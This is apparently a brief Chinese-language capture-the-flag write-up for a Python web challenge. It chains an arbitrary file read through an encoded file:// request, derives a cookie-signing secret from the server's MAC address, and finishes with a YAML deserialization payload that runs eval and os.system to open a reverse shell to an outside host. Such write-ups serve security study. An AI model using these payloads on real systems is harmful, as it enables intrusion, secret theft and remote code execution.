tags:: CTF/Python/YAML

- # 任意文件读取
	- 读取/proc/self/cmdline得知源码在/app/app.py
	- 使用双写构造payload绕过正则读取源文件：``GET /read?url=file:///proc/self/root/%25%36%31pp/%25%36%31pp.py HTTP/1.1``
- # Cookie伪造
	- 读MAC
		- ```python
		  r = base_get(url + "/read", params = {
		      "url": "file:///sys/class/net/eth0/address"
		  }, acceptable_code=None, timeout = 10)
		  mac = "".join(r.text.split(":"))
		  int(mac, 16)
		  # 2485376910098
		  ```
	- 算secret
		- ```python
		  random.seed(2485376910098)
		  str(random.random()*233)
		  # 169.37847730221344
		  ```
- # YAML反序列化
	- ```python
	  file_content = """\
	  !!python/object/new:tuple
	  - !!python/object/new:map
	    - !!python/name:eval
	    - [ "__import__('os').system('{}')" ]
	  """.format(generate_reverse_shell_payload("laserbreakout.eu.org", 3001))
	  
	  r = base_post(url + "/upload", files = {
	      "file": ("a.txt", file_content)
	  })
	  
	  ```